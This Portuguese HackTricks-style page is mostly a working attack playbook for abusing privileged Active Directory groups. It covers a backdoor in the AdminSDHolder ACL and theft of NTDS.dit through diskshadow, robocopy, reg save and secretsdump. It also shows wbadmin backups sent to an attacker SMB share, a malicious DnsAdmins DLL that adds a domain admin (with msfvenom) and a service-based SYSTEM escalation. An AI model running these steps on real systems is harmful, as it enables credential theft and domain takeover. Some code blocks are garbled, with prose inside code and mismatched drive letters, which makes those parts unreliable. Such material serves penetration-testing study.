# Grupos Privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos Bem Conhecidos com privilégios de administração

- **Administradores**
- **Administradores de Domínio**
- **Administradores de Empresa**

## Operadores de Conta

Este grupo tem a capacidade de criar contas e grupos que não são administradores no domínio. Além disso, permite o login local no Controlador de Domínio (DC).

Para identificar os membros deste grupo, o seguinte comando é executado:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Adicionar novos usuários é permitido, assim como o login local no DC01.

## Grupo AdminSDHolder

A lista de controle de acesso (ACL) do grupo **AdminSDHolder** é crucial, pois define permissões para todos os "grupos protegidos" dentro do Active Directory, incluindo grupos de alto privilégio. Esse mecanismo garante a segurança desses grupos, impedindo modificações não autorizadas.

Um atacante poderia explorar isso modificando a ACL do grupo **AdminSDHolder**, concedendo permissões totais a um usuário padrão. Isso daria efetivamente a esse usuário controle total sobre todos os grupos protegidos. Se as permissões desse usuário forem alteradas ou removidas, elas seriam automaticamente restauradas dentro de uma hora devido ao design do sistema.

Os comandos para revisar os membros e modificar permissões incluem:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Um script está disponível para agilizar o processo de restauração: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para mais detalhes, visite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Lixeira do AD

A adesão a este grupo permite a leitura de objetos do Active Directory deletados, o que pode revelar informações sensíveis:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Acesso ao Controlador de Domínio

O acesso a arquivos no DC é restrito, a menos que o usuário faça parte do grupo `Server Operators`, o que altera o nível de acesso.

### Escalação de Privilégios

Usando `PsService` ou `sc` do Sysinternals, é possível inspecionar e modificar permissões de serviço. O grupo `Server Operators`, por exemplo, tem controle total sobre certos serviços, permitindo a execução de comandos arbitrários e a escalação de privilégios:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` têm acesso total, permitindo a manipulação de serviços para privilégios elevados.

## Backup Operators

A filiação no grupo `Backup Operators` fornece acesso ao sistema de arquivos `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem a travessia de pastas, listagem e capacidades de cópia de arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. É necessário utilizar scripts específicos para este processo.

Para listar os membros do grupo, execute:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque Local

Para aproveitar esses privilégios localmente, os seguintes passos são empregados:

1. Importar bibliotecas necessárias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ative e verifique `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acesse e copie arquivos de diretórios restritos, por exemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Ataque AD

O acesso direto ao sistema de arquivos do Controlador de Domínio permite o roubo do banco de dados `NTDS.dit`, que contém todos os hashes NTLM para usuários e computadores do domínio.

#### Usando diskshadow.exe

1. Crie uma cópia sombra do drive `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copie `NTDS.dit` da cópia de sombra:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativamente, use `robocopy` para copiar arquivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraia `SYSTEM` e `SAM` para recuperação de hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recupere todos os hashes do `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Usando wbadmin.exe

1. Configure o sistema de arquivos NTFS para o servidor SMB na máquina do atacante e armazene em cache as credenciais SMB na máquina alvo.
2. Use `wbadmin.exe` para backup do sistema e extração do `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Para uma demonstração prática, veja [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Membros do grupo **DnsAdmins** podem explorar seus privilégios para carregar uma DLL arbitrária com privilégios de SYSTEM em um servidor DNS, frequentemente hospedado em Controladores de Domínio. Essa capacidade permite um potencial de exploração significativo.

Para listar os membros do grupo DnsAdmins, use:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Executar DLL arbitrária

Membros podem fazer o servidor DNS carregar uma DLL arbitrária (localmente ou de um compartilhamento remoto) usando comandos como:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar o serviço DNS (o que pode exigir permissões adicionais) é necessário para que o DLL seja carregado:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para mais detalhes sobre este vetor de ataque, consulte ired.team.

#### Mimilib.dll

Também é viável usar mimilib.dll para execução de comandos, modificando-o para executar comandos específicos ou shells reversos. [Confira este post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para mais informações.

### Registro WPAD para MitM

DnsAdmins podem manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) criando um registro WPAD após desativar a lista de bloqueio de consultas global. Ferramentas como Responder ou Inveigh podem ser usadas para spoofing e captura de tráfego de rede.

### Leitores de Log de Eventos
Membros podem acessar logs de eventos, potencialmente encontrando informações sensíveis, como senhas em texto claro ou detalhes de execução de comandos:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Permissões do Windows do Exchange

Este grupo pode modificar DACLs no objeto do domínio, potencialmente concedendo privilégios DCSync. Técnicas para escalonamento de privilégios explorando este grupo estão detalhadas no repositório Exchange-AD-Privesc do GitHub.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administradores do Hyper-V

Os Administradores do Hyper-V têm acesso total ao Hyper-V, o que pode ser explorado para obter controle sobre Controladores de Domínio virtualizados. Isso inclui clonar DCs ao vivo e extrair hashes NTLM do arquivo NTDS.dit.

### Exemplo de Exploração

O Serviço de Manutenção da Mozilla do Firefox pode ser explorado por Administradores do Hyper-V para executar comandos como SYSTEM. Isso envolve criar um link físico para um arquivo protegido do SYSTEM e substituí-lo por um executável malicioso:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Nota: A exploração de links duros foi mitigada em atualizações recentes do Windows.

## Gerenciamento de Organização

Em ambientes onde o **Microsoft Exchange** está implantado, um grupo especial conhecido como **Gerenciamento de Organização** possui capacidades significativas. Este grupo tem o privilégio de **acessar as caixas de correio de todos os usuários do domínio** e mantém **controle total sobre a Unidade Organizacional (OU) 'Grupos de Segurança do Microsoft Exchange'**. Este controle inclui o grupo **`Exchange Windows Permissions`**, que pode ser explorado para escalonamento de privilégios.

### Exploração de Privilégios e Comandos

#### Operadores de Impressão

Membros do grupo **Operadores de Impressão** são dotados de vários privilégios, incluindo o **`SeLoadDriverPrivilege`**, que lhes permite **fazer logon localmente em um Controlador de Domínio**, desligá-lo e gerenciar impressoras. Para explorar esses privilégios, especialmente se **`SeLoadDriverPrivilege`** não estiver visível em um contexto não elevado, é necessário contornar o Controle de Conta de Usuário (UAC).

Para listar os membros deste grupo, o seguinte comando PowerShell é usado:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Para técnicas de exploração mais detalhadas relacionadas ao **`SeLoadDriverPrivilege`**, deve-se consultar recursos de segurança específicos.

#### Usuários de Área de Trabalho Remota

Os membros deste grupo têm acesso a PCs via Protocolo de Área de Trabalho Remota (RDP). Para enumerar esses membros, comandos do PowerShell estão disponíveis:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Mais informações sobre a exploração do RDP podem ser encontradas em recursos dedicados de pentesting.

#### Usuários de Gerenciamento Remoto

Membros podem acessar PCs através do **Windows Remote Management (WinRM)**. A enumeração desses membros é realizada através de:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para técnicas de exploração relacionadas ao **WinRM**, deve-se consultar a documentação específica.

#### Operadores de Servidor

Este grupo tem permissões para realizar várias configurações em Controladores de Domínio, incluindo privilégios de backup e restauração, alteração da hora do sistema e desligamento do sistema. Para enumerar os membros, o comando fornecido é:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referências <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)


{{#include ../../banners/hacktricks-training.md}}
